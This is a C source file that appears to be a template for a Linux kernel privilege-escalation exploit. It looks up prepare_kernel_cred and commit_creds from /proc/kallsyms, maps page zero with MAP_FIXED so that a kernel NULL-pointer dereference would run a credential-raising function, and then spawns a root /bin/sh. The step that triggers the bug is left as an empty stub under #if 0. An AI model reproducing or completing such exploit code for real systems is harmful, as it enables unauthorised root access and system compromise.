#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *);
typedef int (*commit_creds_t)(struct cred *new);

prepare_kernel_cred_t prepare_kernel_cred=NULL;
commit_creds_t commit_creds=NULL;

void *get_ksym(char *name)
{
	FILE *f = fopen("/proc/kallsyms", "rb");
	char c, sym[512];
	void *addr;
	int ret;

	/* %p - pointer, c - char, %s - name of the symbol */
	while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
		if(!strcmp(sym, name))
			return addr;
	
	return NULL;
}

void get_root(void)
{
	commit_creds(prepare_kernel_cred(NULL));
}

int main(void)
{
	prepare_kernel_cred = get_ksym("prepare_kernel_cred");
	commit_creds = get_ksym("commit_creds");

	if(!(prepare_kernel_cred && commit_creds)) {
		fprintf(stderr, "cannot find symbols\n");
		return -1;
	}

	mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	void(**fn)(void) = NULL;
	*fn = get_root;

#if 0
	int fd = open();
	close(fd);
#endif

	if(getuid() == 0) {
		char *argv[] = {"/bin/sh", NULL};
		execve("/bin/sh", argv, NULL);
	}

	fprintf(stderr, "hmm, we must not be here");
	return 1;
}
